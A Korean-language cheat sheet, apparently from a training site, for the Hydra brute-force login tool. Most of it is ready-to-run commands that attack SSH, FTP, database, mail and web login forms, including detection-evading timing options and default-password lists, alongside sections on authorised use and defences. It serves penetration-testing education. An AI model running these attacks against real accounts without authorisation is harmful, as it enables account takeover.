---
title: 'Hydra 치트 시트'
description: '필수 명령어, 개념 및 모범 사례를 다루는 포괄적인 치트 시트로 Hydra 를 학습하세요.'
pdfUrl: '/cheatsheets/pdf/hydra-cheatsheet.pdf'
---

<base-title :title="frontmatter.title" :description="frontmatter.description">
Hydra 치트 시트
</base-title>

<base-pdf-url :url="frontmatter.pdfUrl" />

<base-disclaimer>
<base-disclaimer-title>
<a target="_blank" href="https://labex.io/ko/learn/hydra">핸즈온 실습으로 Hydra 배우기</a>
</base-disclaimer-title>
<base-disclaimer-content>
핸즈온 실습과 실제 시나리오를 통해 Hydra 암호 크래킹 및 침투 테스트를 학습하세요. LabEx 는 프로토콜 공격, 웹 양식 악용, 성능 최적화 및 윤리적 사용을 다루는 포괄적인 Hydra 과정을 제공합니다. 승인된 보안 테스트 및 취약성 평가를 위한 무차별 대입 기술을 마스터하세요.
</base-disclaimer-content>
</base-disclaimer>

## 기본 구문 및 설치

### 설치: `sudo apt install hydra`

Hydra 는 일반적으로 Kali Linux 에 사전 설치되어 있지만 다른 배포판에도 설치할 수 있습니다.

```bash
# Debian/Ubuntu 시스템에 설치
sudo apt install hydra
# 다른 시스템에 설치
sudo apt-get install hydra
# 설치 확인
hydra -h
# 지원되는 프로토콜 확인
hydra
```

### 기본 구문: `hydra [옵션] 대상 서비스`

기본 구문: `hydra -l <사용자 이름> -P <암호 파일> <대상 프로토콜>://<대상 주소>`

```bash
# 단일 사용자 이름, 암호 목록
hydra -l username -P passwords.txt target.com ssh
# 사용자 이름 목록, 암호 목록
hydra -L users.txt -P passwords.txt target.com ssh
# 단일 사용자 이름, 단일 암호
hydra -l admin -p password123 192.168.1.100 ftp
```

### 핵심 옵션: `-l`, `-L`, `-p`, `-P`

무차별 대입 공격을 위한 사용자 이름과 암호를 지정합니다.

```bash
# 사용자 이름 옵션
-l username          # 단일 사용자 이름
-L userlist.txt      # 사용자 이름 목록 파일
# 암호 옵션
-p password          # 단일 암호
-P passwordlist.txt  # 암호 목록 파일
# 일반적인 단어 목록 위치
/usr/share/wordlists/rockyou.txt
/usr/share/wordlists/metasploit/unix_passwords.txt
```

### 출력 옵션: `-o`, `-b`

나중에 분석할 수 있도록 결과를 파일에 저장합니다.

```bash
# 결과를 파일에 저장
hydra -l admin -P passwords.txt target.com ssh -o results.txt
# JSON 출력 형식
hydra -l admin -P passwords.txt target.com ssh -b json
# 자세한 출력
hydra -l admin -P passwords.txt target.com ssh -V
```

## 프로토콜별 공격

### SSH: `hydra 대상 ssh`

사용자 이름과 암호 조합으로 SSH 서비스를 공격합니다.

```bash
# 기본 SSH 공격
hydra -l root -P /usr/share/wordlists/rockyou.txt 192.168.1.100 ssh
# 여러 사용자 이름
hydra -L users.txt -P passwords.txt ssh://192.168.1.100
# 사용자 지정 SSH 포트
hydra -l admin -P passwords.txt 192.168.1.100 -s 2222 ssh
# 스레딩 사용
hydra -l root -P passwords.txt -t 6 ssh://192.168.1.100
```

### FTP: `hydra 대상 ftp`

FTP 로그인 자격 증명을 무차별 대입합니다.

```bash
# 기본 FTP 공격
hydra -l admin -P passwords.txt ftp://192.168.1.100
# 익명 FTP 확인
hydra -l anonymous -p "" ftp://192.168.1.100
# 사용자 지정 FTP 포트
hydra -l user -P passwords.txt -s 2121 192.168.1.100 ftp
```

### 데이터베이스 공격: `mysql`, `postgres`, `mssql`

자격 증명 무차별 대입으로 데이터베이스 서비스를 공격합니다.

```bash
# MySQL 공격
hydra -l root -P passwords.txt 192.168.1.100 mysql
# PostgreSQL 공격
hydra -l postgres -P passwords.txt 192.168.1.100 postgres
# MSSQL 공격
hydra -l sa -P passwords.txt 192.168.1.100 mssql
# MongoDB 공격
hydra -l admin -P passwords.txt 192.168.1.100 mongodb
```

### SMTP/이메일: `hydra 대상 smtp`

이메일 서버 인증을 공격합니다.

```bash
# SMTP 무차별 대입
hydra -l admin -P passwords.txt smtp://mail.target.com
# null/빈 암호 사용
hydra -P passwords.txt -e ns -V -s 25 smtp.target.com smtp
# IMAP 공격
hydra -l user -P passwords.txt imap://mail.target.com
```

## 웹 애플리케이션 공격

### HTTP POST 양식: `http-post-form`

플레이스홀더 `^USER^` 및 `^PASS^`를 사용하여 HTTP POST 메서드로 웹 로그인 양식을 공격합니다.

```bash
# 기본 POST 양식 공격
hydra -l admin -P passwords.txt 192.168.1.100 http-post-form "/login.php:username=^USER^&password=^PASS^:F=incorrect"
# 사용자 지정 오류 메시지 사용
hydra -l admin -P passwords.txt 192.168.1.100 http-post-form "/login:user=^USER^&pass=^PASS^:Invalid password"
# 성공 조건 사용
hydra -l admin -P passwords.txt 192.168.1.100 http-post-form "/admin:username=^USER^&password=^PASS^:S=Dashboard"
```

### HTTP GET 양식: `http-get-form`

POST 양식과 유사하지만 GET 요청을 대상으로 합니다.

```bash
# GET 양식 공격
hydra -l admin -P passwords.txt 192.168.1.100 http-get-form "/login:username=^USER^&password=^PASS^:F=Invalid"
# 사용자 지정 헤더 사용
hydra -l admin -P passwords.txt 192.168.1.100 http-get-form "/auth:user=^USER^&pass=^PASS^:F=Error:H=Cookie: session=abc123"
```

### HTTP 기본 인증: `http-get`/`http-post`

HTTP 기본 인증을 사용하여 웹 서버를 공격합니다.

```bash
# HTTP 기본 인증
hydra -l admin -P passwords.txt http-get://192.168.1.100
# HTTPS 기본 인증
hydra -l admin -P passwords.txt https-get://secure.target.com
# 사용자 지정 경로 사용
hydra -l admin -P passwords.txt http-get://192.168.1.100/admin
```

### 고급 웹 공격

CSRF 토큰 및 쿠키를 사용하여 복잡한 웹 애플리케이션을 처리합니다.

```bash
# CSRF 토큰 처리 사용
hydra -l admin -P passwords.txt 192.168.1.100 http-post-form "/login:username=^USER^&password=^PASS^&csrf=^CSRF^:F=Error:H=Cookie: csrf=^CSRF^"
# 세션 쿠키 사용
hydra -l admin -P passwords.txt 192.168.1.100 http-post-form "/login:username=^USER^&password=^PASS^:F=Invalid:H=Cookie: PHPSESSID=abc123"
```

## 성능 및 스레딩 옵션

### 스레딩: `-t` (작업)

공격 중 동시 공격 연결 수를 제어합니다.

```bash
# 기본 스레딩 (16개 작업)
hydra -l admin -P passwords.txt target.com ssh
# 사용자 지정 스레드 수
hydra -l admin -P passwords.txt -t 4 target.com ssh
# 고성능 공격 (주의해서 사용)
hydra -l admin -P passwords.txt -t 64 target.com ssh
# 보수적 스레딩 (탐지 방지)
hydra -l admin -P passwords.txt -t 1 target.com ssh
```

### 대기 시간: `-w` (지연)

속도 제한 및 탐지를 방지하기 위해 시도 사이에 지연 시간을 추가합니다.

```bash
# 시도 사이에 30초 대기
hydra -l admin -P passwords.txt -w 30 target.com ssh
# 스레딩과 결합
hydra -l admin -P passwords.txt -t 2 -w 10 target.com ssh
# 무작위 지연 (1-5초)
hydra -l admin -P passwords.txt -W 5 target.com ssh
```

### 여러 대상: `-M` (대상 파일)

파일에 지정하여 여러 호스트를 공격합니다.

```bash
# 대상 파일 생성
echo "192.168.1.100" > targets.txt
echo "192.168.1.101" >> targets.txt
echo "192.168.1.102" >> targets.txt
# 여러 대상 공격
hydra -L users.txt -P passwords.txt -M targets.txt ssh
# 대상별 사용자 지정 스레딩
hydra -L users.txt -P passwords.txt -M targets.txt -t 2 ssh
```

### 재개 및 중지 옵션

중단된 공격을 재개하고 중지 동작을 제어합니다.

```bash
# 첫 번째 성공 후 중지
hydra -l admin -P passwords.txt -f target.com ssh
# 이전 공격 재개
hydra -R
# 복원 파일 생성
hydra -l admin -P passwords.txt -I restore.txt target.com ssh
```

## 고급 기능 및 옵션

### 암호 생성: `-e` (추가 테스트)

추가 암호 변형을 자동으로 테스트합니다.

```bash
# null 암호 테스트
hydra -l admin -e n target.com ssh
# 사용자 이름을 암호로 테스트
hydra -l admin -e s target.com ssh
# 사용자 이름 역순 테스트
hydra -l admin -e r target.com ssh
# 모든 옵션 결합
hydra -l admin -e nsr -P passwords.txt target.com ssh
```

### 콜론 구분 형식: `-C`

공격 시간을 줄이기 위해 사용자 이름:암호 조합을 사용합니다.

```bash
# 자격 증명 파일 생성
echo "admin:admin" > creds.txt
echo "root:password" >> creds.txt
echo "user:123456" >> creds.txt
# 콜론 형식 사용
hydra -C creds.txt target.com ssh
# 전체 조합 테스트보다 빠름
```

### 프록시 지원: `HYDRA_PROXY`

환경 변수를 사용하여 프록시 서버를 통해 공격합니다.

```bash
# HTTP 프록시
export HYDRA_PROXY=connect://proxy.example.com:8080
hydra -l admin -P passwords.txt target.com ssh
# 인증을 통한 SOCKS4 프록시
export HYDRA_PROXY=socks4://user:pass@127.0.0.1:1080
# SOCKS5 프록시
export HYDRA_PROXY=socks5://proxy.example.com:1080
```

### 암호 목록 최적화: `pw-inspector`

pw-inspector 를 사용하여 정책에 따라 암호 목록을 필터링합니다.

```bash
# 암호 필터링 (최소 6자, 2개 문자 클래스)
cat passwords.txt | pw-inspector -m 6 -c 2 -n > filtered.txt
# 필터링된 목록을 Hydra와 함께 사용
hydra -l admin -P filtered.txt target.com ssh
# 먼저 중복 제거
cat passwords.txt | sort | uniq > unique_passwords.txt
```

## 윤리적 사용 및 모범 사례

### 법률 및 윤리 지침

Hydra 는 합법적으로 또는 불법적으로 사용될 수 있습니다. 무차별 대입 공격을 수행하기 전에 적절한 권한과 승인을 받으십시오.

```text
명시적 승인을 얻은 시스템에서만 공격을 수행하십시오
항상 시스템 소유자 또는 관리자로부터 명시적인 승인을 받았는지 확인하십시오
규정 준수를 위해 모든 테스트 활동을 문서화하십시오
승인된 침투 테스트 중에만 사용하십시오
무단 액세스 시도에 절대 사용하지 마십시오
```

### 방어 조치

강력한 암호와 정책으로 무차별 대입 공격으로부터 방어합니다.

```text
실패 시도 후 계정을 일시적으로 잠그는 계정 잠금 정책 구현
다단계 인증 (MFA) 사용
자동화 도구를 방지하기 위해 CAPTCHA 시스템 구현
인증 시도 모니터링 및 로깅
속도 제한 및 IP 차단 구현
```

### 테스트 모범 사례

보수적인 설정으로 시작하고 투명성을 위해 모든 활동을 문서화합니다.

```text
서비스 중단을 방지하기 위해 낮은 스레드 수로 시작하십시오
대상 환경에 적합한 단어 목록을 사용하십시오
가능한 경우 승인된 유지 관리 기간 동안 테스트하십시오
테스트 중 대상 시스템 성능을 모니터링하십시오
사고 대응 절차를 준비하십시오
```

### 일반적인 사용 사례

레드 팀과 블루 팀 모두 암호 감사, 보안 평가 및 침투 테스트를 위해 이점을 얻습니다.

```text
약한 암호를 식별하고 암호 강도를 평가하기 위한 암호 크래킹
네트워크 서비스의 보안 감사
침투 테스트 및 취약성 평가
암호 정책에 대한 규정 준수 테스트
교육 및 시연
```

## GUI 대안 및 추가 도구

### XHydra: GUI 인터페이스

XHydra 는 명령줄 스위치 대신 GUI 를 통해 구성을 선택할 수 있는 Hydra 의 GUI 입니다.

```bash
# XHydra GUI 실행
xhydra
# 사용 가능한 경우 설치
sudo apt install hydra-gtk
# 기능:
# - 클릭 기반 인터페이스
# - 사전 구성된 공격 템플릿
# - 시각적 진행 상황 모니터링
# - 쉬운 대상 및 단어 목록 선택
```

### Hydra Wizard: 대화형 설정

간단한 질문을 통해 hydra 설정을 안내하는 대화형 마법사입니다.

```bash
# 대화형 마법사 실행
hydra-wizard
# 마법사가 묻는 항목:
# 1. 공격할 서비스
# 2. 공격할 대상
# 3. 사용자 이름 또는 사용자 이름 파일
# 4. 암호 또는 암호 파일
# 5. 추가 암호 테스트
# 6. 포트 번호
# 7. 최종 확인
```

### 기본 암호 목록: `dpl4hydra`

특정 브랜드 및 시스템에 대한 기본 암호 목록을 생성합니다.

```bash
# 기본 암호 데이터베이스 새로 고침
dpl4hydra refresh
# 특정 브랜드 목록 생성
dpl4hydra cisco
dpl4hydra netgear
dpl4hydra linksys
# 생성된 목록 사용
hydra -C dpl4hydra_cisco.lst 192.168.1.1 ssh
# 모든 브랜드
dpl4hydra all
```

### 다른 도구와의 통합

정찰 및 열거 도구와 Hydra 를 결합합니다.

```bash
# Nmap 서비스 검색과 결합
nmap -sV 192.168.1.0/24 | grep -E "(ssh|ftp|http)"
# 사용자 이름 열거 결과와 함께 사용
enum4linux 192.168.1.100 | grep "user:" > users.txt
# Metasploit 단어 목록과 통합
ls /usr/share/wordlists/metasploit/
```

## 문제 해결 및 성능

### 일반적인 문제 및 해결 방법

Hydra 사용 중 발생하는 일반적인 문제를 해결합니다.

```bash
# 연결 시간 초과 오류
hydra -l admin -P passwords.txt -t 1 -w 30 target.com ssh
# 연결 초과 오류
hydra -l admin -P passwords.txt -t 2 target.com ssh
# 메모리 사용량 최적화
hydra -l admin -P small_list.txt target.com ssh
# 지원되는 프로토콜 확인
hydra
# 지원되는 서비스 목록에서 프로토콜 확인
```

### 성능 최적화

암호 목록을 최적화하고 더 빠른 결과를 위해 가능성에 따라 정렬합니다.

```bash
# 암호를 가능성에 따라 정렬
hydra -l admin -P passwords.txt -u target.com ssh
# 중복 제거
sort passwords.txt | uniq > clean_passwords.txt
# 대상에 따른 스레딩 최적화
# 로컬 네트워크: -t 16
# 인터넷 대상: -t 4
# 느린 서비스: -t 1
```

### 출력 형식 및 분석

결과 분석 및 보고를 위한 다양한 출력 형식.

```bash
# 표준 텍스트 출력
hydra -l admin -P passwords.txt target.com ssh -o results.txt
# 구문 분석을 위한 JSON 형식
hydra -l admin -P passwords.txt target.com ssh -b json -o results.json
# 디버깅을 위한 자세한 출력
hydra -l admin -P passwords.txt target.com ssh -V
# 성공 전용 출력
hydra -l admin -P passwords.txt target.com ssh | grep "password:"
```

### 리소스 모니터링

공격 중 시스템 및 네트워크 리소스를 모니터링합니다.

```bash
# CPU 사용량 모니터링
top -p $(pidof hydra)
# 네트워크 연결 모니터링
netstat -an | grep :22
# 메모리 사용량 모니터링
ps aux | grep hydra
# 시스템 영향 제한
nice -n 19 hydra -l admin -P passwords.txt target.com ssh
```

## 관련 링크

- <router-link to="/kali">Kali Linux 치트 시트</router-link>
- <router-link to="/cybersecurity">사이버 보안 치트 시트</router-link>
- <router-link to="/nmap">Nmap 치트 시트</router-link>
- <router-link to="/wireshark">Wireshark 치트 시트</router-link>
- <router-link to="/comptia">CompTIA 치트 시트</router-link>
- <router-link to="/linux">Linux 치트 시트</router-link>
- <router-link to="/shell">Shell 치트 시트</router-link>
- <router-link to="/devops">DevOps 치트 시트</router-link>
